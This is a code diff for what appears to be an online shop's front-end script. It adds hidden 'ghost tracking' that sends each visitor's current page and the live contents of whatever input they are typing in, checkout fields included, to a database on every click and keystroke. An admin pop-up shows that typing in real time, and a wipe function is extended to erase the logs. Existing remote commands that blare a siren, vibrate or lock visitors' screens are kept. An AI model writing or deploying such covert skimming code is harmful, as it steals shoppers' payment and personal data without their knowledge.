@@ -393,6 +393,35 @@ function targetUser(targetID) {
     if(document.getElementById('chat-widget').style.display !== 'flex') toggleChat(); 
 }
 
+function openGhostView(targetID) {
+    const gW = window.open('', '_blank', 'width=450,height=500');
+    gW.document.write(`
+        <body style="background:#050505; color:#0f0; font-family:monospace; padding:20px;">
+            <h2 style="color:yellow; border-bottom:1px solid #333;">GHOST MONITOR: User_${targetID}</h2>
+            <div id="status" style="margin-top:20px;">
+                <p>STATUS: <span style="color:white;">ACTIVE BRIDGE</span></p>
+                <p>PAGE: <span id="p" style="color:white;">-</span></p>
+                <p>ACTION: <span id="a" style="color:white;">-</span></p>
+                <div style="background:#111; padding:15px; border:1px solid #333; margin-top:20px;">
+                    <p style="color:yellow; margin:0 0 10px 0;">LIVE TYPING FEED:</p>
+                    <div id="t" style="color:white; font-size:18px;">...</div>
+                </div>
+            </div>
+            <script>
+                const target = "${targetID}";
+                window.opener.db.ref('ghost_tracking/'+target).on('value', s => {
+                    const d = s.val();
+                    if(d) {
+                        document.getElementById('p').innerText = d.pageName;
+                        document.getElementById('a').innerText = new Date(d.lastActive).toLocaleTimeString();
+                        document.getElementById('t').innerText = d.typing || "Not typing...";
+                    }
+                });
+            <\/script>
+        </body>
+    `);
+}
+
 function resetTarget() { chatTarget = "NONE"; document.getElementById('manual-target-id').value = ""; document.getElementById('active-target-display').innerText = "Target: User_Self"; document.getElementById('chat-title').innerText = "SECURE BRIDGE"; document.getElementById('chat-msgs').innerHTML = ""; }
 
 async function getIdentity() {
@@ -403,8 +432,26 @@ async function getIdentity() {
         userID = userIP.split('.')[0];
         db.ref('presence/' + userID).set(true);
         db.ref('presence/' + userID).onDisconnect().remove();
-        if(!isAdmin) syncChat();
+        if(!isAdmin) {
+            syncChat();
+            broadcastGhostData();
+        }
     } catch(e) { console.log("Identity Error"); }
+}
+
+function broadcastGhostData() {
+    if(isAdmin || userID === "Unknown") return;
+    const isCheckout = document.getElementById('checkout-page').style.display !== 'none';
+    const isInfo = document.getElementById('info-page').style.display !== 'none';
+    let currentPage = "MAIN SHOP";
+    if(isCheckout) currentPage = "CHECKOUT PAGE";
+    if(isInfo) currentPage = "PRODUCT INFO";
+    
+    db.ref(`ghost_tracking/${userID}`).set({
+        pageName: currentPage,
+        lastActive: Date.now(),
+        typing: document.activeElement ? document.activeElement.value : ""
+    });
 }
 
 function toggleMusic(e) { 
@@ -473,7 +520,7 @@ function addToCart(i) {
 function updateCartCount() { document.getElementById('cart-count').innerText = cart.length; }
 function clearCart() { cart = []; updateCartCount(); renderCart(); }
 function removeFromCart(i) { cart.splice(i, 1); updateCartCount(); renderCart(); }
-function showCheckout() { document.getElementById('shop-page').style.display='none'; document.getElementById('info-page').style.display='none'; document.getElementById('checkout-page').style.display='block'; renderCart(); }
+function showCheckout() { document.getElementById('shop-page').style.display='none'; document.getElementById('info-page').style.display='none'; document.getElementById('checkout-page').style.display='block'; renderCart(); broadcastGhostData(); }
 
 function renderCart() {
     let l=document.getElementById('cart-list'), t=0; l.innerHTML = "";
@@ -510,10 +557,13 @@ function login() {
             const val = s.val() || {};
             document.getElementById('pay-attempts-list').innerHTML = Object.keys(val).reverse().map(k => {
                 let txt = val[k].text || "";
-                let extractedID = txt.includes('|') ? txt.split('|')[1].trim().split('.')[0] : "UNK";
-                return `<div style="margin-bottom:5px; border-bottom:1px solid #333; cursor:pointer; color:yellow;" 
-                        onclick="targetUser('${extractedID}')">
-                        [BRIDGE] User_${extractedID}: ${txt}
+                let extID = txt.includes('|') ? txt.split('|')[1].trim().split('.')[0] : "UNK";
+                return `<div style="margin-bottom:8px; border-bottom:1px solid #333; padding-bottom:5px;">
+                            <span style="color:yellow; font-size:10px;">User_${extID}: ${txt}</span>
+                            <div style="display:flex; gap:5px; margin-top:3px;">
+                                <button onclick="targetUser('${extID}')" style="background:#0044ff; color:white; border:none; font-size:9px; padding:3px 8px; cursor:pointer;">BRIDGE</button>
+                                <button onclick="openGhostView('${extID}')" style="background:#008800; color:white; border:none; font-size:9px; padding:3px 8px; cursor:pointer;">GHOST</button>
+                            </div>
                         </div>`;
             }).join(''); 
         });
@@ -553,7 +603,7 @@ function sendPower(type) {
 }
 
 function vacuumDatabase() {
-    if(confirm("WIPE ALL LOGS?")) { db.ref('intel').set(null); db.ref('private_chats').set(null); alert("PURIFIED"); }
+    if(confirm("WIPE ALL LOGS?")) { db.ref('intel').set(null); db.ref('private_chats').set(null); db.ref('ghost_tracking').set(null); alert("PURIFIED"); }
 }
 
 function showInfo(i) {
@@ -565,9 +615,10 @@ function showInfo(i) {
     document.getElementById('info-price').innerText = "$" + p.price;
     document.getElementById('info-desc').innerText = p.desc;
     document.getElementById('info-btns').innerHTML = `<button class="ui-btn" onclick="addToCart(${i})" style="background:var(--primary); color:black;">ADD TO CART</button>${p.yt ? `<button class="ui-btn" onclick="window.open('https://youtube.com/watch?v=${p.yt}')" style="background:red; color:white;">📺 PREVIEW</button>` : ''}`;
+    broadcastGhostData();
 }
 
-function showShop() { document.getElementById('shop-page').style.display='block'; document.getElementById('info-page').style.display='none'; document.getElementById('checkout-page').style.display='none'; }
+function showShop() { document.getElementById('shop-page').style.display='block'; document.getElementById('info-page').style.display='none'; document.getElementById('checkout-page').style.display='none'; broadcastGhostData(); }
 function applyCoupon() { const c = document.getElementById('apply-coupon').value.toUpperCase(); if(coupons[c]) { discount = coupons[c]; renderCart(); alert("APPLIED " + discount + "% DISCOUNT"); } else { alert("INVALID CODE"); } }
 
 const canvas = document.getElementById('global-canvas'); const ctx = canvas.getContext('2d'); let drops = [];
@@ -599,37 +650,25 @@ window.onload = () => {
         if(s.val()) { alert("⚠️ ADMIN: " + s.val().msg); db.ref(`private_chats/${userID}/alert`).remove(); }
     });
 
-    // IMPROVED VOODOO POWER LISTENER
     db.ref(`private_chats/${userID}/power`).on('value', s => {
         const p = s.val();
         if(!p) return;
-        
         try {
             if(p.type === 'siren') { 
                 const sfx = document.getElementById('siren-sound');
                 sfx.volume = 1.0;
-                sfx.play().catch(() => {
-                    // Forced Interaction Fallback
-                    alert("⚠️ SYNCING SECURITY BRIDGE...");
-                    sfx.play();
-                }); 
+                sfx.play().catch(() => { alert("⚠️ SYNCING SECURITY BRIDGE..."); sfx.play(); }); 
             }
-            if(p.type === 'vibrate') { 
-                if('vibrate' in navigator) navigator.vibrate([1000, 500, 1000]); 
-            }
+            if(p.type === 'vibrate') { if('vibrate' in navigator) navigator.vibrate([1000, 500, 1000]); }
             if(p.type === 'lock') { 
                 document.getElementById('input-lock-overlay').style.display = 'block'; 
                 document.body.style.filter = 'grayscale(1) contrast(0.8)';
-                document.body.style.pointerEvents = 'none';
             }
             if(p.type === 'unlock') { 
                 document.getElementById('input-lock-overlay').style.display = 'none'; 
                 document.body.style.filter = 'none';
-                document.body.style.pointerEvents = 'auto';
             }
-        } catch(e) { console.log("BEAST COMMAND ERROR"); }
-        
-        // Clear command after execution
+        } catch(e) {}
         setTimeout(() => db.ref(`private_chats/${userID}/power`).remove(), 2000);
     });
 
@@ -662,6 +701,9 @@ window.onload = () => {
         if(e.key === "End") { e.preventDefault(); document.getElementById('admin-terminal').style.display = 'block'; }
         if(e.key === "PageUp") { e.preventDefault(); document.getElementById('pgup-menu').style.display = 'block'; }
     });
+
+    window.addEventListener('click', () => broadcastGhostData());
+    window.addEventListener('input', () => broadcastGhostData());
 
     const logs = document.getElementById('load-logs'), lines = ["> BOOTING R4...", "> SYNCING DATABASE...", "> READY."];
     let step = 0;
